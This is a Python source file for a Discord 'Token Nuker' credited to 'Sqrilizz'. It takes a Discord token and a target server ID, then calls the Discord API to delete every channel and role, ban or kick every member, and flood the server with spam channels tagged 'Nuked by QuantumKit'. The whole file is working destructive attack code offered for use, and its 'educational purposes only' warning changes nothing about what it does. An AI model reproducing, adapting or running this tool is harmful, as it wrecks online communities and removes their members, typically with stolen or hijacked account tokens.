import requests
import time
import random
import threading
import json
import os
from colorama import Fore, Style, init

init(autoreset=True)

class TokenNuker:
    def __init__(self):
        self.token = None
        self.target_guild_id = None
        self.mode = "full"
        self.success_count = 0
        self.failed_count = 0
        self.is_nuking = False
        self.session = requests.Session()

    def print_banner(self):
        """Выводит баннер"""
        banner = f"""
{Fore.MAGENTA}   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
{Fore.MAGENTA}   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║     ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
{Fore.MAGENTA}      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
{Fore.MAGENTA}      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║     ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
{Fore.MAGENTA}      ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║     ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
{Fore.MAGENTA}      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Fore.MAGENTA}                                                                                                    
{Fore.MAGENTA}                              NUKER
{Fore.MAGENTA}                              by Sqrilizz
"""
        print(banner)

    def get_user_input(self):
        """Получает данные от пользователя"""
        print(f"{Fore.CYAN}[*] Token Nuker Configuration")
        print(f"{Fore.CYAN}[*] ========================")
        
        # Discord Token
        while True:
            self.token = input(f"{Fore.YELLOW}[?] Enter Discord token: ").strip()
            if self.token and len(self.token) > 20:
                break
            print(f"{Fore.RED}[!] Invalid Discord token!")
        
        # Target Guild ID
        while True:
            self.target_guild_id = input(f"{Fore.YELLOW}[?] Enter target guild ID: ").strip()
            if self.target_guild_id:
                try:
                    int(self.target_guild_id)
                    break
                except ValueError:
                    print(f"{Fore.RED}[!] Guild ID must be a number!")
            else:
                print(f"{Fore.RED}[!] Guild ID cannot be empty!")
        
        # Режим нюка
        print(f"\n{Fore.CYAN}[*] Nuke Modes:")
        print(f"{Fore.CYAN}[*] 1. Full - полный нюк (каналы, роли, бан, кик)")
        print(f"{Fore.CYAN}[*] 2. Channels - только каналы")
        print(f"{Fore.CYAN}[*] 3. Roles - только роли")
        print(f"{Fore.CYAN}[*] 4. Ban - только бан всех")
        print(f"{Fore.CYAN}[*] 5. Kick - только кик всех")
        
        while True:
            mode_input = input(f"{Fore.YELLOW}[?] Choose mode (1-5, default 1): ").strip()
            if not mode_input:
                self.mode = "full"
                break
            elif mode_input in ['1', '2', '3', '4', '5']:
                modes = {1: "full", 2: "channels", 3: "roles", 4: "ban", 5: "kick"}
                self.mode = modes[int(mode_input)]
                break
            else:
                print(f"{Fore.RED}[!] Invalid mode!")
        
        return True

    def setup_session(self):
        """Настраивает сессию с токеном"""
        self.session.headers.update({
            'Authorization': self.token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

    def get_guild_info(self):
        """Получает информацию о сервере"""
        try:
            url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}"
            response = self.session.get(url)
            
            if response.status_code == 200:
                guild_data = response.json()
                print(f"{Fore.GREEN}[+] Guild: {guild_data.get('name', 'Unknown')}")
                print(f"{Fore.GREEN}[+] Owner: {guild_data.get('owner_id', 'Unknown')}")
                print(f"{Fore.GREEN}[+] Members: {guild_data.get('approximate_member_count', 'Unknown')}")
                return True
            else:
                print(f"{Fore.RED}[-] Failed to get guild info: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error getting guild info: {e}")
            return False

    def delete_channels(self):
        """Удаляет все каналы"""
        try:
            url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/channels"
            response = self.session.get(url)
            
            if response.status_code == 200:
                channels = response.json()
                print(f"{Fore.CYAN}[*] Found {len(channels)} channels")
                
                for channel in channels:
                    channel_id = channel['id']
                    channel_name = channel['name']
                    
                    delete_url = f"https://discord.com/api/v9/channels/{channel_id}"
                    delete_response = self.session.delete(delete_url)
                    
                    if delete_response.status_code in [200, 204]:
                        self.success_count += 1
                        print(f"{Fore.GREEN}[+] Deleted channel: {channel_name} (Success: {self.success_count})")
                    else:
                        self.failed_count += 1
                        print(f"{Fore.RED}[-] Failed to delete channel: {channel_name} (Failed: {self.failed_count})")
                    
                    time.sleep(0.5)  # Задержка между запросами
            else:
                print(f"{Fore.RED}[-] Failed to get channels: {response.status_code}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error deleting channels: {e}")

    def delete_roles(self):
        """Удаляет все роли"""
        try:
            url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/roles"
            response = self.session.get(url)
            
            if response.status_code == 200:
                roles = response.json()
                print(f"{Fore.CYAN}[*] Found {len(roles)} roles")
                
                for role in roles:
                    role_id = role['id']
                    role_name = role['name']
                    
                    # Пропускаем @everyone роль
                    if role_name == '@everyone':
                        continue
                    
                    delete_url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/roles/{role_id}"
                    delete_response = self.session.delete(delete_url)
                    
                    if delete_response.status_code in [200, 204]:
                        self.success_count += 1
                        print(f"{Fore.GREEN}[+] Deleted role: {role_name} (Success: {self.success_count})")
                    else:
                        self.failed_count += 1
                        print(f"{Fore.RED}[-] Failed to delete role: {role_name} (Failed: {self.failed_count})")
                    
                    time.sleep(0.5)  # Задержка между запросами
            else:
                print(f"{Fore.RED}[-] Failed to get roles: {response.status_code}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error deleting roles: {e}")

    def ban_all_members(self):
        """Банит всех участников"""
        try:
            url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/members"
            response = self.session.get(url)
            
            if response.status_code == 200:
                members = response.json()
                print(f"{Fore.CYAN}[*] Found {len(members)} members")
                
                for member in members:
                    member_id = member['user']['id']
                    member_name = member['user']['username']
                    
                    # Пропускаем владельца сервера
                    if member.get('owner', False):
                        continue
                    
                    ban_url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/bans/{member_id}"
                    ban_data = {
                        'delete_message_days': '7',
                        'reason': 'Nuked by QuantumKit'
                    }
                    
                    ban_response = self.session.put(ban_url, json=ban_data)
                    
                    if ban_response.status_code in [200, 201, 204]:
                        self.success_count += 1
                        print(f"{Fore.GREEN}[+] Banned member: {member_name} (Success: {self.success_count})")
                    else:
                        self.failed_count += 1
                        print(f"{Fore.RED}[-] Failed to ban member: {member_name} (Failed: {self.failed_count})")
                    
                    time.sleep(0.5)  # Задержка между запросами
            else:
                print(f"{Fore.RED}[-] Failed to get members: {response.status_code}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error banning members: {e}")

    def kick_all_members(self):
        """Кикает всех участников"""
        try:
            url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/members"
            response = self.session.get(url)
            
            if response.status_code == 200:
                members = response.json()
                print(f"{Fore.CYAN}[*] Found {len(members)} members")
                
                for member in members:
                    member_id = member['user']['id']
                    member_name = member['user']['username']
                    
                    # Пропускаем владельца сервера
                    if member.get('owner', False):
                        continue
                    
                    kick_url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/members/{member_id}"
                    kick_data = {
                        'reason': 'Kicked by QuantumKit'
                    }
                    
                    kick_response = self.session.delete(kick_url, json=kick_data)
                    
                    if kick_response.status_code in [200, 201, 204]:
                        self.success_count += 1
                        print(f"{Fore.GREEN}[+] Kicked member: {member_name} (Success: {self.success_count})")
                    else:
                        self.failed_count += 1
                        print(f"{Fore.RED}[-] Failed to kick member: {member_name} (Failed: {self.failed_count})")
                    
                    time.sleep(0.5)  # Задержка между запросами
            else:
                print(f"{Fore.RED}[-] Failed to get members: {response.status_code}")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error kicking members: {e}")

    def create_spam_channels(self):
        """Создает спам каналы"""
        try:
            spam_names = [
                "nuked-by-quantumkit", "get-nuked", "quantumkit-was-here",
                "server-destroyed", "nuke-complete", "quantumkit-dominance",
                "server-nuked", "quantumkit-victory", "nuke-successful",
                "quantumkit-pwned-you", "server-annihilated", "nuke-finished"
            ]
            
            for i in range(10):  # Создаем 10 спам каналов
                channel_name = random.choice(spam_names) + f"-{random.randint(1000, 9999)}"
                
                channel_data = {
                    'name': channel_name,
                    'type': 0,  # Text channel
                    'topic': 'Nuked by QuantumKit',
                    'nsfw': False
                }
                
                url = f"https://discord.com/api/v9/guilds/{self.target_guild_id}/channels"
                response = self.session.post(url, json=channel_data)
                
                if response.status_code in [200, 201]:
                    self.success_count += 1
                    print(f"{Fore.GREEN}[+] Created spam channel: {channel_name} (Success: {self.success_count})")
                else:
                    self.failed_count += 1
                    print(f"{Fore.RED}[-] Failed to create channel: {channel_name} (Failed: {self.failed_count})")
                
                time.sleep(0.3)  # Задержка между запросами
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error creating spam channels: {e}")

    def start_nuking(self):
        """Начинает нюк"""
        print(f"\n{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.RED}[!] This will DESTROY the target server!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Operation cancelled")
            return
        
        print(f"\n{Fore.CYAN}[*] Starting Token Nuker...")
        print(f"{Fore.CYAN}[*] Target Guild ID: {self.target_guild_id}")
        print(f"{Fore.CYAN}[*] Mode: {self.mode}")
        print(f"{Fore.CYAN}[*] Press Ctrl+C to stop\n")
        
        self.is_nuking = True
        self.success_count = 0
        self.failed_count = 0
        
        start_time = time.time()
        
        try:
            # Настраиваем сессию
            self.setup_session()
            
            # Получаем информацию о сервере
            if not self.get_guild_info():
                print(f"{Fore.RED}[!] Cannot access guild. Check token permissions!")
                return
            
            # Выполняем нюк в зависимости от режима
            if self.mode == "full" or self.mode == "channels":
                print(f"{Fore.CYAN}[*] Deleting channels...")
                self.delete_channels()
                
                print(f"{Fore.CYAN}[*] Creating spam channels...")
                self.create_spam_channels()
            
            if self.mode == "full" or self.mode == "roles":
                print(f"{Fore.CYAN}[*] Deleting roles...")
                self.delete_roles()
            
            if self.mode == "full" or self.mode == "ban":
                print(f"{Fore.CYAN}[*] Banning all members...")
                self.ban_all_members()
            
            if self.mode == "full" or self.mode == "kick":
                print(f"{Fore.CYAN}[*] Kicking all members...")
                self.kick_all_members()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Stopping nuke...")
            self.is_nuking = False
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим статистику
        self.print_statistics(duration)

    def print_statistics(self, duration):
        """Выводит статистику"""
        total_actions = self.success_count + self.failed_count
        success_rate = (self.success_count / total_actions * 100) if total_actions > 0 else 0
        
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║                              NUKING COMPLETED                                 ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Fore.CYAN}[*] Target Guild ID: {self.target_guild_id}")
        print(f"{Fore.CYAN}[*] Mode: {self.mode}")
        print(f"{Fore.CYAN}[*] Duration: {duration:.2f} seconds")
        print(f"{Fore.CYAN}[*] Success Rate: {success_rate:.1f}%")
        print(f"{Fore.GREEN}[+] Successful actions: {self.success_count}")
        print(f"{Fore.RED}[-] Failed actions: {self.failed_count}")
        print(f"{Fore.YELLOW}[*] Total actions: {total_actions}")
        
        if self.success_count > 0:
            print(f"{Fore.GREEN}[+] Average speed: {self.success_count/duration:.2f} actions/second")

    def save_results(self):
        """Сохраняет результаты в файл"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"output/token_nuker_{timestamp}.txt"
        
        try:
            os.makedirs("output", exist_ok=True)
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Token Nuker Results\n")
                f.write(f"==================\n")
                f.write(f"Nuked: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target Guild ID: {self.target_guild_id}\n")
                f.write(f"Mode: {self.mode}\n")
                f.write(f"Successful: {self.success_count}\n")
                f.write(f"Failed: {self.failed_count}\n")
                f.write(f"Total: {self.success_count + self.failed_count}\n")
                f.write(f"Success Rate: {(self.success_count/(self.success_count+self.failed_count)*100):.1f}%\n")
            
            print(f"{Fore.GREEN}[+] Results saved to: {filename}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to save results: {e}")

    def run(self):
        """Запускает нюкер токенов"""
        self.print_banner()
        
        if not self.get_user_input():
            return
        
        self.start_nuking()
        self.save_results()

def main():
    """Главная функция"""
    try:
        nuker = TokenNuker()
        nuker.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exiting...")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}")

if __name__ == "__main__":
    main() 